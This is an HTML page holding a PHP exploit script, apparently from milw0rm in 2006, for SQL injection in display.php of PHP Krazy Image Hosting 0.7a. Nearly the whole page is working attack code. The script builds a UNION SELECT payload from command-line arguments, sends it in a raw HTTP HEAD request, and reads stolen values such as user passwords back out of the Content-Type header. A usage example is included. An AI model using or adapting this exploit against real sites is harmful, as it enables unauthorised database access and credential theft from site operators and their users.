<html><head><title>PHP Krazy Image Hosting 0.7a (display.php) SQL Injection Exploit</title></head><pre>&lt;?
/*****************************************************************\
|* PHP Krazy Image Host Script (id) Remote SQL Injection Exploit *|
|* Discovered by: Trex                                           *|
|* Solution: http://www.trex-online.net/fixes/display.rar        *|
|* Visit: Trex-Online.net / UnderGround.ag                       *|
\*****************************************************************/

error_reporting(0);

echo &quot;# PHP Krazy Image Host Script (id) Remote SQL Injection Exploit\n&quot;;
echo &quot;# Discovered by: Trex\n&quot;;
echo &quot;# Solution: http://www.trex-online.net/fixes/display.rar\n&quot;;
echo &quot;# Visit: Trex-Online.net / UnderGround.ag\n\n&quot;;
echo &quot;# Usage: $ php &quot; . $_SERVER['PHP_SELF'] . &quot; [URL] [PATH] [SELECT] [FROM] [WHERE]\n&quot;;
echo &quot;# Example: $ php &quot; . $_SERVER['PHP_SELF'] . &quot; http://localhost /images/ password users userID=1\n\n&quot;;

if (!$_SERVER['argv'][5])
	die();

$url = parse_url($_SERVER['argv'][1] . $_SERVER['argv'][2]);

$sql = &quot;UNION+SELECT+1,1,1,1,&quot; . $_SERVER['argv'][3] . &quot;,1,1,1+FROM+&quot; . $_SERVER['argv'][4] . &quot;+WHERE+&quot; . $_SERVER['argv'][5] . &quot;/*&quot;;

echo &quot;Connecting to &quot; . $url['host'] . &quot;:80 ... &quot;;

if (!$fsp = fsockopen($url['host'], 80, $errno, $errstr, $timeout))
	die(&quot;failed.\nReason: &quot; . $errno . &quot; - &quot; . $errstr);

echo &quot;done.\n\n&quot;;

$request  = &quot;HEAD &quot; . $url['path'] . &quot;display.php?id=0+&quot; . $sql . &quot; HTTP/1.1\r\n&quot;;
$request .= &quot;Host: &quot; . $url['host'] . &quot;\r\n&quot;;
$request .= &quot;Connection: Close\r\n\r\n&quot;;

fputs($fsp, $request);

while (!feof($fsp)) {
	$response = fgets($fsp, 4096);
	$response = explode(&quot;:&quot;, $response, 2);

	if (count($response) == 2 &amp;&amp; preg_match(&quot;/Content-Type/&quot;, $response[0]))
		$result = $response[1];
}

if (preg_match(&quot;/text\/html/&quot;, $result))
	echo &quot;Exploit failed!&quot;;
else
	echo &quot;Result: &quot; . $result;
?&gt;

# milw0rm.com [2006-09-29]</pre></html>